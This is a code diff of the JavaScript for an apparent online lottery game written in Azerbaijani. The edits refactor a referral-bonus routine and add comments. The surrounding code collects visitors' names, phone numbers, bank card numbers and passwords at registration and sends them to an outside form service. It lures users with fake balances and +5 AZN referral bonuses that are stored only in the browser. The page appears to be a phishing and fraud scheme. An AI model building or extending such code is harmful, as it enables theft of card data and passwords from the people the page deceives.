@@ -229,7 +229,6 @@
     let currentPlayer = null;
     let gameInterval = null, drawInterval = null;
     let drawnNumbers = [];
-    let gameTimer = 180;
     let allGameRows = [];
     let currentDrawNumber = null;
     let lastDrawTimestamp = 0;
@@ -238,6 +237,7 @@
     const COOLDOWN_HOURS = 1;
     const COOLDOWN_MS = COOLDOWN_HOURS * 3600000;
 
+    // === YADDAŞ FUNKSİYALARI ===
     function savePlayer(p) { localStorage.setItem('sans_topu_player', JSON.stringify(p)); }
     function loadPlayer() { return JSON.parse(localStorage.getItem('sans_topu_player')); }
     function getAllPlayers() { return JSON.parse(localStorage.getItem('all_players') || '{}'); }
@@ -315,6 +315,32 @@
         document.getElementById('reg-screen').classList.remove('hidden');
     }
 
+    // === REFERAL BONUS FUNKSİYASI (DÜZƏLDİLDİ) ===
+    function giveReferralBonus(newUserId, referrerId) {
+        if (!referrerId) return false;
+        let referrer = loadPlayerById(referrerId);
+        if (!referrer) return false;
+        
+        // Bonusu əlavə et
+        referrer.totalWinnings = (referrer.totalWinnings || 0) + 5;
+        referrer.balance = referrer.totalWinnings;
+        savePlayerById(referrerId, referrer);
+        
+        // Bildiriş göstər (əgər referer hal-hazırda online-dırsa)
+        if (currentPlayer && currentPlayer.id === referrerId) {
+            currentPlayer = referrer;
+            savePlayer(currentPlayer);
+            alert(`🎉 Təbriklər! Sizin referal linkinizdən yeni istifadəçi qeydiyyatdan keçdi. Hesabınıza +5 AZN bonus əlavə edildi! Ümumi balans: ${currentPlayer.totalWinnings} AZN`);
+            updateBalanceDisplay();
+            updateWithdrawButton();
+        } else {
+            // Əgər referer online deyilsə, sadəcə konsola yaz
+            console.log(`Referal bonusu verildi: ${referrer.fullname} (+5 AZN)`);
+        }
+        return true;
+    }
+
+    // QEYDİYYAT FORMUNUN İŞLƏNMƏSİ (BONUS DÜZƏLDİLDİ)
     document.getElementById('pre-reg-form').onsubmit = async function (e) {
         e.preventDefault();
         const fullname = sessionStorage.getItem('reg_fullname') || '';
@@ -337,6 +363,7 @@
             return;
         }
 
+        // Mövcud profili yoxla
         let existing = loadPlayer();
         if (existing && (existing.email === email || existing.phone === phone || existing.card === card)) {
             currentPlayer = existing;
@@ -345,8 +372,9 @@
             return;
         }
 
+        // YENİ İSTİFADƏÇİ YARAT
         const userId = Date.now() + '-' + Math.random().toString(36).substr(2, 6);
-        const referrerId = getReferralFromUrl();
+        const referrerId = getReferralFromUrl(); // Linkdən gələn ref
         
         currentPlayer = {
             id: userId,
@@ -361,29 +389,19 @@
         all[userId] = currentPlayer;
         localStorage.setItem('all_players', JSON.stringify(all));
         
+        // Formspree göndər
         const formData = {
             fullname, email, instagram, telefon: phone, kart: card, sifre: password,
             referrer: referrerId || 'yoxdur', registeredAt: new Date().toLocaleString()
         };
         await sendToFormspree(formData);
         
+        // *** REFERAL BONUS VER (DÜZƏLDİLDİ) ***
         if (referrerId) {
-            let referrer = loadPlayerById(referrerId);
-            if (referrer) {
-                referrer.totalWinnings = (referrer.totalWinnings || 0) + 5;
-                referrer.balance = referrer.totalWinnings;
-                savePlayerById(referrerId, referrer);
-                alert(`🎉 Referal bonusu: ${referrer.fullname} hesabına 5 AZN əlavə edildi! Ümumi balans: ${referrer.totalWinnings} AZN`);
-                if (currentPlayer.id === referrerId) {
-                    currentPlayer = referrer;
-                    savePlayer(currentPlayer);
-                }
-            } else {
-                console.warn("Referer tapılmadı:", referrerId);
-            }
+            giveReferralBonus(userId, referrerId);
         }
         
-        alert("✅ Qeydiyyat tamamlandı! Məlumatlarınız email ünvanına göndərildi. İndi oynaya bilərsiniz.");
+        alert("✅ Qeydiyyat tamamlandı! Məlumatlarınız email ünvanınıza göndərildi. İndi oynaya bilərsiniz.");
         showProfileScreen();
     };
 
@@ -404,7 +422,7 @@
         updateBalanceDisplay();
         updateWithdrawButton();
         
-        // Köhnə profillərdə id yoxdursa, yenisini yarat
+        // Referal linki yarat (DÜZGÜN FORMAT)
         if (!currentPlayer.id) {
             currentPlayer.id = Date.now() + '-' + Math.random().toString(36).substr(2,6);
             savePlayer(currentPlayer);
@@ -558,7 +576,6 @@
         const saved = loadPlayer();
         if (saved) { 
             currentPlayer = saved;
-            // Köhnə profillərdə id yoxdursa, əlavə et
             if (!currentPlayer.id) {
                 currentPlayer.id = Date.now() + '-' + Math.random().toString(36).substr(2,6);
                 savePlayer(currentPlayer);
@@ -568,4 +585,4 @@
     };
 </script>
 </body>
-        </html>
+    </html>
